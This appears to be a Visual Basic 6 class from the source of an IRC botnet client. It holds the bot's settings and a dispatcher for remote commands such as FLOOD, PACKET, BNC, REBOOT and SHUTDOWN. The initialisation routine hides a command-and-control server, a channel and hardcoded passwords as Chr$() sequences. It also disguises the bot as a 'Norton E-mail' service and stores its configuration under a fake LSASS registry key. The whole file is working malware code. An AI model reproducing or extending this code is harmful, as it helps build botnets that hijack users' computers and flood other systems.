VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "clsBotSettings"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit

Private Type STRUCT_BOT
    Nick As String
    Server As String
    Port As Long
    Channel As String
    ChanPass As String
    Pass As String
    Prefix As String
    Version As String
    LoginNick As String
    LoginIdent As String
    LoginHost As String
    FloodName As String
    FloodCount As Integer
    Admin As String
    CurrentDir As String
    BNCPort As Long
    ServiceName As String
    Location As String
    BridgeChannel As String
    BridgeNick As String
    BridgeServer As String
    BridgePort As Integer
    BridgeType As String
    BridgeIndex As Integer
End Type
Private BotSettings As STRUCT_BOT
Private BotCommands As clsBotCommands

Public Property Get Nick() As String
    Nick = BotSettings.Nick
End Property

Public Property Let Nick(sNick As String)
    BotSettings.Nick = sNick$
End Property

Public Property Get Server() As String
    Server = BotSettings.Server
End Property

Public Property Let Server(sServer As String)
    BotSettings.Server = sServer$
End Property

Public Property Get Port() As Integer
    Port = BotSettings.Port
End Property

Public Property Let Port(nPort As Integer)
    BotSettings.Port = nPort%
End Property

Public Property Get Channel() As String
    Channel = BotSettings.Channel
End Property

Public Property Let Channel(sChannel As String)
    BotSettings.Channel = sChannel$
End Property

Public Property Get Pass() As String
    Pass = BotSettings.Pass
End Property

Public Property Let Pass(sPass As String)
    BotSettings.Pass = sPass$
End Property

Public Property Get ChanPass() As String
    ChanPass = BotSettings.ChanPass
End Property

Public Property Let ChanPass(sChannelPass As String)
    BotSettings.ChanPass = sChannelPass$
End Property

Public Property Get Prefix() As String
    Prefix = BotSettings.Prefix
End Property

Public Property Let Prefix(sPrefix As String)
    BotSettings.Prefix = sPrefix$
End Property

Public Property Get Version() As String
    Version = BotSettings.Version
End Property

Public Property Get LoginNick() As String
    LoginNick = BotSettings.LoginNick
End Property

Public Property Let LoginNick(sLoginNick As String)
    BotSettings.LoginNick = sLoginNick$
End Property

Public Property Get LoginIdent() As String
    LoginIdent = BotSettings.LoginIdent
End Property

Public Property Let LoginIdent(sLoginIdent As String)
    BotSettings.LoginIdent = sLoginIdent$
End Property

Public Property Get LoginHost() As String
    LoginHost = BotSettings.LoginHost
End Property

Public Property Let LoginHost(sLoginHost As String)
    BotSettings.LoginHost = sLoginHost$
End Property

Public Property Get BridgeChannel() As String
    BridgeChannel = BotSettings.BridgeChannel
End Property

Public Property Let BridgeChannel(sChannel As String)
    BotSettings.BridgeChannel = sChannel$
End Property

Public Property Get BridgeNick() As String
    BridgeNick = BotSettings.BridgeNick
End Property

Public Property Let BridgeNick(sNick As String)
    BotSettings.BridgeNick = sNick$
End Property

Public Property Get BridgeServer() As String
    BridgeServer = BotSettings.BridgeServer
End Property

Public Property Let BridgeServer(sServer As String)
    BotSettings.BridgeServer = sServer$
End Property

Public Property Get BridgeType() As String
    BridgeType = BotSettings.BridgeType
End Property

Public Property Let BridgeType(sType As String)
    BotSettings.BridgeType = sType$
End Property

Public Property Get BridgePort() As Integer
    BridgePort = BotSettings.BridgePort
End Property

Public Property Let BridgePort(nPort As Integer)
    BotSettings.BridgePort = nPort%
End Property

Public Property Get BridgeIndex() As Integer
    BridgeIndex = BotSettings.BridgeIndex
End Property

Public Property Let BridgeIndex(nIndex As Integer)
    BotSettings.BridgeIndex = nIndex%
End Property

Public Property Get FloodName() As String
    FloodName = BotSettings.FloodName
End Property

Public Property Let FloodName(sFloodName As String)
    BotSettings.FloodName = sFloodName$
End Property

Public Property Get FloodCount() As Integer
    FloodCount = BotSettings.FloodCount
End Property

Public Property Let FloodCount(nFloodCount As Integer)
    BotSettings.FloodCount = nFloodCount%
End Property

Public Property Get Admin() As String
    Admin = BotSettings.Admin
End Property

Public Property Let Admin(sAdminPass As String)
    BotSettings.Admin = sAdminPass$
End Property

Public Property Get BNCPort() As Integer
    BNCPort = BotSettings.BNCPort
End Property

Public Property Let BNCPort(nPort As Integer)
    BotSettings.BNCPort = nPort%
End Property

Public Property Get ServiceName() As String
    ServiceName = BotSettings.ServiceName
End Property

Public Property Let ServiceName(sServiceName As String)
    BotSettings.ServiceName = sServiceName$
End Property

Public Property Get Location() As String
    Location = BotSettings.Location
End Property

Private Sub Class_Initialize()
    Dim sTemp As String, nK As Integer
    Set BotCommands = New clsBotCommands
    For nK% = 0 To 8
        Randomize
        BotSettings.Nick = BotSettings.Nick & Chr$(Fix((Rnd * 26) + 97))
    Next nK%
    BotSettings.Location = App.Path & "\" & App.EXEName & ".exe"
    BotSettings.ChanPass = DeCrypt(System.GetSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\LSASS", Crypt("Channel Pass")))
    BotSettings.Version = Chr$(52) & Chr$(120) & Chr$(49) & Chr$(48) & Chr$(109) & Chr$(32) & Chr$(118) & App.Major & "." & App.Minor & "." & App.Revision
    sTemp$ = DeCrypt(System.GetSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\LSASS", Crypt("Pass")))
    BotSettings.Pass = sTemp$
    If sTemp$ = "" Then BotSettings.Pass = Chr$(57) & Chr$(56) & Chr$(116) & Chr$(49) & Chr$(101) & Chr$(120) & Chr$(101)
    BotSettings.Admin = Chr$(97) & Chr$(49) & Chr$(50) & Chr$(98) & Chr$(122) & Chr$(100) & Chr$(57) & Chr$(48)
    sTemp$ = DeCrypt(System.GetSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\LSASS", Crypt("Channel")))
    BotSettings.Channel = sTemp$
    If sTemp$ = "" Then BotSettings.Channel = Chr$(35) & Chr$(114) & Chr$(112) & Chr$(99) & Chr$(115) & Chr$(115)
    sTemp$ = DeCrypt(System.GetSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\LSASS", Crypt("Server")))
    BotSettings.Server = sTemp$
    If sTemp$ = "" Then BotSettings.Server = Chr$(105) & Chr$(114) & Chr$(99) & Chr$(46) & Chr$(109) & Chr$(97) & Chr$(110) & Chr$(115) & Chr$(104) & Chr$(97) & Chr$(100) & Chr$(111) & Chr$(119) & Chr$(46) & Chr$(111) & Chr$(114) & Chr$(103)
    sTemp$ = DeCrypt(System.GetSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\LSASS", Crypt("Port")))
    BotSettings.Port = Val(sTemp$)
    If Val(sTemp$) < 1 Then BotSettings.Port = 7000
    sTemp$ = DeCrypt(System.GetSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\LSASS", Crypt("Prefix")))
    BotSettings.Prefix = sTemp$
    If sTemp$ = "" Then BotSettings.Prefix = "."
    sTemp$ = DeCrypt(System.GetSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\LSASS", Crypt("Service Name")))
    BotSettings.ServiceName = sTemp$
    If sTemp$ = "" Then BotSettings.ServiceName = Chr$(78) & Chr$(111) & Chr$(114) & Chr$(116) & Chr$(111) & Chr$(110) & Chr$(32) & Chr$(69) & Chr$(45) & Chr$(109) & Chr$(97) & Chr$(105) & Chr$(108)
End Sub

Private Sub Class_Terminate()
    Set BotCommands = Nothing
End Sub

Public Sub CommandProcess(sCommand As String, sParams As String, nIndex As Integer)
    Select Case UCase$(sCommand$)
        Case "QUIT": Call BotCommands.Quit(sParams$, nIndex%)
        Case "JOIN": Call BotCommands.Join(sParams$, nIndex%)
        Case "PACKET": Call BotCommands.Packet(sParams$, nIndex%)
        Case "LOGOUT": Call BotCommands.Logout(sParams$, nIndex%)
        Case "PART": Call BotCommands.Part(sParams$, nIndex%)
        Case "BNC": Call BotCommands.BNC(sParams$, nIndex%)
        Case "BNCSTOP": Call BotCommands.BNCStop(sParams$, nIndex%)
        Case "HELP": Call BotCommands.Help(sParams$, nIndex%)
        Case "FLOOD": Call BotCommands.Flood(sParams$, nIndex%)
        Case "BRIDGE": Call BotCommands.Bridge(sParams$, nIndex%)
        Case "BRIDGESTOP": Call BotCommands.BridgeStop(sParams$, nIndex%)
        Case "REBOOT": Call BotCommands.Reboot(sParams$, nIndex%)
        Case "LOGOFF": Call BotCommands.Logoff(sParams$, nIndex%)
        Case "SHUTDOWN": Call BotCommands.Shutdown(sParams$, nIndex%)
        Case "BRIDGETYPE": Call BotCommands.BridgeType(sParams$, nIndex%)
    End Select
End Sub
